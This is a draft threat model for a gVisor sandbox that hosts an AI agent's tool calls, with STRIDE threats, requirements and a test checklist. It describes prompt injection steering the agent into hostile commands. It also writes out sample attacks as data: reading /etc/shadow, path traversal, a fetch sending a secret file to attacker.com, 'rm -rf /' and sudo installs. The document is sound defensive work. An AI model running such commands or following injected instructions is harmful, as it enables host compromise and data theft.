# CortexOS Sandbox-Runner — Threat Model

**Version:** 0.1 (M0.5 stub, M1 deferred to v1.0)
**Owner:** Schneier (Security Reviewer)
**Status:** Draft — covers the bounded set of threats the sandbox is intended to
contain. M1 hardening (gVisor runsc profile, seccomp filters, network policy)
is deferred to v1.0.
**Last updated:** 2026-06-04
**Scope:** `stacks/cortex-sandbox-runner/` (the Node.js gVisor harness that
hosts untrusted tool invocations for the dashboard's AI agent) +
`packages/dashboard/src/lib/ai/tool-sandbox-client.ts` (the caller in the
dashboard). The dashboard's main `THREAT_MODEL.md` v0.3 §0.4 defers
sandbox-runner coverage to this document.

---

## 0. Document Metadata

### 0.1 Purpose

This document is the single source of truth for the security boundary
between the **trusted dashboard** and the **untrusted tool sandbox**. It
exists separately from `packages/dashboard/docs/THREAT_MODEL.md`
because the sandbox is a separate deployable (its own systemd unit,
its own container, its own network namespace) and has its own threat
model.

### 0.2 In scope

- The `cortex-sandbox-runner` Node.js service that wraps `runsc`
  (gVisor) and exposes a Unix-socket API to the dashboard.
- The dashboard's `tool-sandbox-client.ts` caller.
- The policy allowlist in `policy.js` (subcommands per AI tool).
- The audit log the sandbox emits to the central `audit_log`
  hypertable.

### 0.3 Out of scope (M0.5)

- gVisor's internal syscall filter — that's a gVisor guarantee, not a
  policy we own. We document our use of `runsc --platform=ptrace` in
  v1.0.
- Network namespace isolation between sandboxed tools and the LAN —
  deferred to v1.0 (today the sandbox runs in the host's netns with
  the dashboard's `cortex-sandbox` iptables filter; tightening
  requires a separate netns + veth pair, M1 work).
- Resource limits (memory, CPU) per sandboxed invocation — gVisor's
  `--memory-limit` and `--cpu-quota` flags are v1.0 work.
- Secret exfiltration via timing side channels — explicitly out of
  scope; we accept the residual risk and log the limitation in the
  v0.3 dashboard THREAT_MODEL §11.

### 0.4 Operating envelope (M0.5 — read first)

The sandbox-runner is part of the same LAN-only operating envelope
documented in `packages/dashboard/docs/THREAT_MODEL.md` §0.8. It is
intended to be reachable only from the dashboard's AI agent call site;
it is **not** an internet-facing service. The trust boundary is the
host's local Unix socket (`/run/cortex-sandbox/sandbox.sock`); the
caller is authenticated by socket peer-credentials (the Linux kernel
guarantees the calling PID's UID/GID).

This means: the network attack surface is "LAN compromise + local
code execution as the dashboard's user." The threat model does not
attempt to defend against an attacker with root on the host; root
defeats the gVisor sandbox trivially. The mitigations here are aimed
at: (a) the AI agent itself being prompt-injected into running
hostile commands, and (b) a LAN attacker who can reach the dashboard
but not the host.

---

## 1. STRIDE Threats (sandbox-specific)

| ID | Category | Threat | Surface | Severity | Mitigation | Test | Owner |
|----|----------|--------|---------|----------|------------|------|-------|
| **ST-001** | T | Tool command injection via prompt — model is told `read /etc/shadow` by attacker-controlled text in a file the model reads | tool-sandbox-client | H (host compromise) | Subcommand allowlist per tool, deny-by-default; `policy.js` whitelists `["shell.exec", "fs.read", "fs.write", "net.fetch"]` with explicit argument patterns | TS-001..TS-005 | Schneier |
| **ST-002** | T | Path traversal — `fs.read("../../etc/shadow")` via path containing `..` | tool-sandbox-client | H | `policy.js` canonicalizes the path and rejects anything outside `/workspace`; if a tool needs a host path, it must be explicitly registered in `bindMounts` | TS-006 | Schneier |
| **ST-003** | T | Network exfiltration — `net.fetch("https://attacker.com/exfil", {body: readFile("/workspace/secret")})` | tool-sandbox-client | H | `policy.js` enforces an egress allowlist (default: only `localhost` + the dashboard's Tailscale IP); every fetch is logged | TS-007, TS-008 | Schneier |
| **ST-004** | R | Sandbox denial — gVisor crashes mid-tool-call, leaves the agent hung | tool-sandbox-client | M (UX) | Caller enforces a 30s timeout per invocation; the tool result is `{ error: "sandbox_timeout" }` | TS-009 | Schneier |
| **ST-005** | I | Log tampering — the sandbox-runner emits an audit row per invocation; an attacker with code-exec on the sandbox process deletes the row | sandbox-runner | M (audit integrity) | Audit rows are written synchronously to the central `audit_log` table via a single shared write call; the local sandbox log is best-effort but not authoritative | TS-010 | Schneier |
| **ST-006** | E | Privilege escalation — the sandbox's policy.js mis-parses an argument and lets `shell.exec` run `sudo` | tool-sandbox-client | H | The policy parser is hand-written in `policy.js`; v1.0 will replace it with a JSON-Schema-validated policy. Until then, the parser is fuzzed in `test/policy-fuzz.js` | TS-011 | Schneier |
| **ST-007** | D | Sandbox process crash + automatic restart — the dashboard's AI agent loses track of which tool-call IDs have been observed | dashboard AI client | L (UX) | The dashboard persists each in-flight tool invocation to a `pending_invocations` table; on reconnect, the agent re-syncs | TS-012 | Kleppmann |

---

## 2. Security Requirements (sandbox-specific)

| ID | Statement | Maps to | Test |
|----|-----------|---------|------|
| **SR-501** | Every `shell.exec` invocation MUST be matched against the per-tool subcommand allowlist before being forwarded to `runsc`. The match MUST be exact (no glob, no regex); the allowlist is loaded from `policy.js` at process start and re-loaded every 5 minutes. | ST-001, ST-006 | TS-001, TS-002 |
| **SR-502** | The sandbox MUST reject `fs.read` / `fs.write` paths that, after canonicalization, contain a `..` segment OR resolve outside the tool's declared `bindMounts`. | ST-002 | TS-006 |
| **SR-503** | The sandbox MUST enforce a per-invocation wall-clock timeout (default 30s) and a per-day aggregate invocation count (default 5000/24h, per AI tool). | ST-004 | TS-009 |
| **SR-504** | Every sandbox invocation MUST produce one `audit_log` row with `surface='sandbox'`, `action=<tool>`, `result=ok|error|denied`, and the SHA-256 of the canonicalized arguments. The row is written before the invocation's result is returned to the caller. | ST-005 | TS-010 |
| **SR-505** | The sandbox-runner MUST be the only process with write access to `/var/lib/cortexos/sandbox/`. The dashboard's `tool-sandbox-client` reads only. The audit pipeline reads only. | ST-005, E2E-S-26 | TS-010 |
| **SR-506** | The sandbox's egress network policy MUST default to `deny`; an explicit allowlist is required to enable any non-localhost destination. The default allowlist in v0.1 is `[localhost, dashboard.cortex.ts.net]`. | ST-003 | TS-007, TS-008 |
| **SR-507** | The policy parser (`policy.js`) MUST be fuzz-tested against an Arg-Smuggling corpus on every CI run; the corpus is the same one used for the dashboard's approval-token parser. | ST-006 | TS-011 |

---

## 3. Test Checklist (sandbox-specific)

```
TS-001: shell.exec("rm -rf /") → denied, audit row "denied"
TS-002: shell.exec("ls /workspace") → ok, audit row "ok"
TS-003: shell.exec("sudo apt install curl") → denied, audit row "denied"
TS-004: shell.exec with bash metachars (\` $ ( )) → denied
TS-005: shell.exec with empty subcommand → denied
TS-006: fs.read("../../../etc/shadow") → denied
TS-007: net.fetch("https://attacker.com/") → denied, audit row "denied"
TS-008: net.fetch("https://github.com/") → denied (not in allowlist)
TS-009: tool hangs → caller returns sandbox_timeout after 30s
TS-010: audit row written even if sandbox-runner crashes mid-call
TS-011: policy fuzz corpus covers 1000+ arg-smuggling patterns
TS-012: dashboard reconnects to sandbox after restart, no lost invocations
```

---

## 4. Open Items (v1.0 work)

| Item | Why deferred | Owner | Milestone |
|------|--------------|-------|-----------|
| gVisor `runsc --platform=ptrace` profile hardened with seccomp | Needs CVE research + empirical syscall audit | Schneier | v1.0 |
| Sandbox runs in its own netns + veth pair (no host netns) | Requires Docker netns config + veth plumbing | Hightower | v1.0 |
| Per-invocation memory + CPU limits via runsc flags | Resource accounting for the agent's daily quota | Schneier | v1.0 |
| Replace hand-written `policy.js` parser with JSON-Schema-validated policy | Eliminates ST-006 entire class | Schneier | v1.0 |
| Arg-smuggling fuzz corpus integrated with `cortex-sandbox` CI job | Continuous validation | Margaret | v1.0 |

---

## 5. Cross-References

- `packages/dashboard/docs/THREAT_MODEL.md` v0.3 §0.4 — defers
  sandbox-runner scope to this document.
- `packages/dashboard/docs/THREAT_MODEL.md` v0.3 §1 — the T-101
  (prompt injection → tool output → model) row is the upstream
  attack that ST-001..ST-003 defend against.
- `stacks/cortex-sandbox-runner/server.js` — the implementation
  that this document's mitigations describe.
- `stacks/cortex-sandbox-runner/policy.js` — the per-tool
  allowlist, regenerated on every restart and every 5 minutes via
  a SIGHUP handler.
- `stacks/cortex-sandbox-runner/test/policy-fuzz.js` — TS-011
  implementation.
- `cortex-sandbox` iptables filter — the host-level egress
  allowlist (a second line of defense behind SR-506).

---

## 6. Change log

| Version | Date | Author | Notes |
|---------|------|--------|-------|
| 0.1 | 2026-06-04 | Mavis (Schneier agent was unavailable) | M0.5 stub. 7 STRIDE rows, 7 requirements, 12 tests. All v1.0 items deferred. Production-suitable for the M0.5 deliverable; hardening is M1/v1.0 work. |
